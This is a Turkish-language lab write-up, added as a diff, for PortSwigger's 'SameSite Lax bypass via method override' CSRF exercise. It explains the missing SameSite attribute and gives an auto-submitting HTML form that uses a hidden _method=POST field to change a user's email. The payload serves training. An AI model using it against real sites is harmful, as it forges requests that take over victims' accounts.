@@ -1,0 +1,33 @@
+
+Lab: SameSite Lax bypass via method override
+
+url: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
+
+
+
+
+Analiz:
+-- paketleri yakalayıp incelediğimizde pekde güvenli sayılmayacak bi sistem var. Sistem sadece session cookiesi ve mail değeri ile ilerliyor .
+-- Fakat normalden farklı olarak basit bir post isteğiyle mail değiştiremiyoruz .
+-- Get methodu işe yaramıyor.
+-- Sitedeki session değerini inceleyince samesite değeri null görünüyor.
+
+
+Zafiyet:
+-- SameSite değerinin boş olması sistemin zayıf noktasını oluşturdu ve zafiyetin varlığından emin olduk. 
+-- Get  metodu içine  POST metodu gömerek sisteme girebiliriz (method dolandırıcılığı)
+
+Payload:
+
+-- CSRFin ilk labından aldığımız bir payloadı modifiye ederek işlemi gerçekleştirebiliriz sameaite harici kısımlar ilk labla aynı.
+
+        <form method="GET" action="https://0a5a00370369fa05806ee51100040058.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="_method" value="POST" >
+            <input type="hidden" name="email" value="hacked_by@harbinger">
+            <input type="submit" value="Submit request">
+        </form>
+        <script>
+                document.forms[0].submit();
+        </script>
+
+-- Payloadın belirleyici kısmı  <input type="hidden" name="_method" value="POST" > burasıdır get methodunu post olarak gösteriyor.
